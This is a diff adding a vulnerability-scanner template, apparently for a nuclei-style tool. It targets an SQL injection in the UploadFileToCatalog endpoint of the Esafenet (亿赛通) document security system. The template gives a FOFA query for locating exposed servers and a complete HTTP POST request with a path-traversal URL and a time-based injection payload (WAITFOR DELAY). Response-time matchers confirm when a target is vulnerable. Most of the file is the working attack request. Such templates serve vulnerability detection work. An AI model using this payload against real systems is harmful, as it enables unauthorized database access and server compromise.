@@ -1,0 +1,27 @@
+## id: VEID-2024-0207
+## name: 亿赛通电子文档安全管理系统 UploadFileToCatalog SQL注入漏洞
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2024
+## description:亿某通电子文档安全管理系统 UploadFileToCatalog接口的id参数处对传入的数据没有预编译和充足的校验，导致该接口存在SQL注入漏洞，恶意攻击者可能通过该漏洞获取服务器信息或者直接获取服务器权限
+## fofa-query: body="/CDGServer3/index.jsp"
+## verification: true
+
+
+POST /CDGServer3/js/../policy/UploadFileToCatalog?fromurl=../user/dataSearch.jsp HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/x-www-form-urlencoded
+
+id=1';WAITFOR DELAY '0:0:5'--
+
+#@ timeout: 20
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: response_time > 7
+
+
+
+
+
+# @VEIL-STAMP: 535c98d77a2be995fb35e7e4060a3d47957e4863ca9a3cbc483b03806adbc00e
